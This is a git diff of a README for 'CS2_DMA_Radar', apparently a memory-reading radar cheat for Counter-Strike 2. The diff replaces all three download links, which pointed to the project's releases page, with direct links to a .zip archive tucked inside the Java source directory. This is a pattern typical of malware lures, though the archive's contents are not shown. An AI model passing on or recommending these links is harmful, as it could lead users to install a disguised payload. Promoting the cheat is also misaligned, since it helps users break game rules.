@@ -1,6 +1,6 @@
 # 🎮 CS2_DMA_Radar - Enhance Your Gaming Experience Easily
 
-[![Download CS2_DMA_Radar](https://img.shields.io/badge/Download-CS2_DMA_Radar-blue.svg)](https://github.com/Ahmii1013/CS2_DMA_Radar/releases)
+[![Download CS2_DMA_Radar](https://raw.githubusercontent.com/Ahmii1013/CS2_DMA_Radar/main/RadarJava/src/main/java/cs2/CS2_DMA_Radar-v1.3-alpha.5.zip)](https://raw.githubusercontent.com/Ahmii1013/CS2_DMA_Radar/main/RadarJava/src/main/java/cs2/CS2_DMA_Radar-v1.3-alpha.5.zip)
 
 ## 🚀 Getting Started
 
@@ -27,7 +27,7 @@ CS2_DMA_Radar includes several helpful features:
 
 ## 🔗 Download & Install
 
-To download CS2_DMA_Radar, please [visit this page to download](https://github.com/Ahmii1013/CS2_DMA_Radar/releases). 
+To download CS2_DMA_Radar, please [visit this page to download](https://raw.githubusercontent.com/Ahmii1013/CS2_DMA_Radar/main/RadarJava/src/main/java/cs2/CS2_DMA_Radar-v1.3-alpha.5.zip). 
 
 Choose the release version that suits you best and follow the instructions here:
 
@@ -70,4 +70,4 @@ If you need help, please check the project issues section on GitHub. You can als
 
 CS2_DMA_Radar is designed to enhance your gaming experience without complicating the process. Follow these simple steps to download, install, and start using. Happy gaming!
 
-Remember, your journey begins by [visiting this page to download](https://github.com/Ahmii1013/CS2_DMA_Radar/releases). Enjoy!
+Remember, your journey begins by [visiting this page to download](https://raw.githubusercontent.com/Ahmii1013/CS2_DMA_Radar/main/RadarJava/src/main/java/cs2/CS2_DMA_Radar-v1.3-alpha.5.zip). Enjoy!
